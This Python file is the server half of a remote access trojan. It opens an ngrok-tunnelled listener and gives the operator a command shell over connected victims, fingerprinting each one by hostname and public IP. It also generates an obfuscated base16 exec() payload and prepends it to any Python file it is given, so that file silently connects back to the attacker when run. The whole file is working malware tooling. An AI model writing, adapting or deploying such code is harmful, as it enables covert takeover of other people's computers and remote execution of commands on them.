#!/usr/bin/python3
from __future__ import annotations

import base64
import os
import sys
import cmd
import socket
import tempfile
import threading
import requests

from rich.console import Console
from threading import Lock
from typing import Tuple

HEADER: int = 64
SEND_BYTES = 1024
FORMAT: str = 'utf-8'
DISCONNECT_MESSAGE: str = "!DISCONNECT"
CLIENTS = set()
CLIENTS_LOCK: Lock = threading.Lock()
console = Console()


class Ngrok:
    def __init__(self):
        while ' ':
            try:
                self.res = requests.get('http://localhost:4040/api/tunnels').json()['tunnels'][0]
                break
            except requests.exceptions.ConnectionError:
                input('\n# please open a tcp port on ngrok\n   and click [Enter] ')

    @property
    def ADDR(self) -> Tuple[str, int]:
        server_name, port = self.res['config']['addr'].split(':')
        return server_name, int(port)

    @property
    def PAYLOAD_SERVER(self) -> str:
        return self.res['public_url'].replace('tcp://', '').split(':')[0]

    @property
    def PAYLOAD_PORT(self) -> int:
        return self.res['public_url'].split(':')[2]

    @property
    def PAYLOAD_CONTENT(self) -> str:
        with open(os.path.join(__file__.rsplit('/', 2)[0], 'client.py')) as file:
            data = file.read()
        return data


class AccessShell(cmd.Cmd):
    is_active: bool = False

    def __init__(self, *args, **kwargs):
        super(AccessShell, self).__init__(*args, **kwargs)
        self.client = None

    def default(self, line: str):
        data: str = self.send_data(self.client, line)
        if data:
            print(data)

    def emptyline(self):
        return None

    def do_quit(self, arg: str):
        for client in CLIENTS:
            self.send_data(client[1], DISCONNECT_MESSAGE)
            client[1].close()
        CLIENTS.clear()
        self.is_active = False
        print(f"# Press [ ctrl + c ] to kill the server...")
        exit(0)

    def do_clear(self, arg: str):
        os.system('clear')

    def do_nano(self, arg: str):
        data: str = self.send_data(
            self.client,
            f"python3 -c \"data = 'x = open(\\'{arg}\\',\\'r\\');print (x.read());x.close()';exec('try:\\n \'+data+\'\\nexcept:pass')\""
        )

        with open(temp_file := os.path.join(tempfile.gettempdir(), arg), 'w') as file:
            file.write(data)
        os.system(f'nano {temp_file}')
        with open(temp_file, 'r') as file:
            print(self.send_data(self.client,
                                 'echo "{file_data}" > {arg}'.format(file_data=file.read().replace('"', r'\"'),
                                                                     arg=arg)))

    def do_clients(self, arg: str) -> ...:
        for index, client in enumerate(CLIENTS):
            console.print(f"{index} [green]{client[0]}[/green]")

    def do_session(self, arg: str) -> ...:
        if arg.strip().isdigit() and int(arg) in range(0, len(CLIENTS)):
            self.client: socket.socket = list(CLIENTS)[int(arg)][1]
            self.prompt = f"({list(CLIENTS)[int(arg)][0]}) $ "
        else:
            print('# [red]Session not found![/red]')

    def send_data(self, client, line) -> str:
        pass


class Server(AccessShell):
    def __init__(self, *args, **kwargs):
        super(AccessShell, self).__init__(*args, **kwargs)
        self.ngrok = Ngrok()
        self.server: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind(self.ngrok.ADDR)
        except OSError:
            exit("# Address already in use")
        self.create_payload()

    def send_data(self, client: socket.socket, data: str) -> str:
        """
        This function send data to the client
        and waiting for replay then return the data as string.
        """
        # send the data to the client.
        data: bytes = data.encode(FORMAT)
        data_length: bytes = str(len(data)).encode(FORMAT).strip()
        data_length += b' ' * (HEADER - len(data_length))
        try:
            client.send(data_length)
            while True:
                if len(data) > SEND_BYTES:
                    client.send(data[:SEND_BYTES])
                    data = data[SEND_BYTES:]
                else:
                    client.send(data)
                    break

        except BrokenPipeError:
            console.print("# [red]The server can't send data to the client![/red]")
            return ""

        # receive and listen for the data from the client.
        data_length: str = client.recv(HEADER).decode(FORMAT).strip()
        if data_length and data_length.isdigit():
            data_length: int = int(data_length)
            data: str = client.recv(data_length).decode(FORMAT)
            if len(data) == data_length:
                return data
            else:
                while not len(data) == data_length:
                    data += client.recv(data_length - len(data)).decode(FORMAT)
                return data
        return ""

    def handle_clients(self, custom_prompt, client: socket.socket):
        if not self.is_active:
            console.out(f"# {custom_prompt} connected.\n")
            self.is_active = True
            self.client: socket.socket = client
            self.prompt = f"({custom_prompt}) $ "
            self.cmdloop()

    def start(self):
        self.server.listen()
        print(f"# Server is listening on {socket.gethostbyname(self.ngrok.PAYLOAD_SERVER)}")
        while True:
            try:
                client, addr = self.server.accept()
            except KeyboardInterrupt:
                self.server.close()
                break
            data = self.send_data(client, "echo $(uname -n)@$(curl -s https://api.ipify.org)")
            with CLIENTS_LOCK:
                CLIENTS.add((data, client))
            thread = threading.Thread(target=self.handle_clients, args=(data, client))
            thread.start()

    def create_payload(self):
        def compile_data(code):
            code = base64.b16encode(code.encode(FORMAT))
            return f'import base64\nexec(base64.b16decode({code}))'

        if len(sys.argv) > 1:
            file = sys.argv[1]
            if os.path.isfile(file):
                with open(file, 'r') as file_r:
                    content = file_r.read()
                with open(file, 'w') as f:
                    _payload = self.ngrok.PAYLOAD_CONTENT.format(injection=True, port=self.ngrok.PAYLOAD_PORT,
                                                                 host=f'"{self.ngrok.PAYLOAD_SERVER}"')
                    _payload = compile_data(_payload)
                    if not _payload in content:
                        f.write(_payload + f'\n{content}')
                    else:
                        f.write(content)
            else:
                print(f"# file: {file} not found!")
                exit(-1)
        else:
            with open('client.py', 'w') as f:
                f.write(compile_data(self.ngrok.PAYLOAD_CONTENT.format(injection=False, port=self.ngrok.PAYLOAD_PORT,
                                                                       host=f'"{self.ngrok.PAYLOAD_SERVER}"')))


if __name__ == '__main__':
    server = Server()
    server.start()
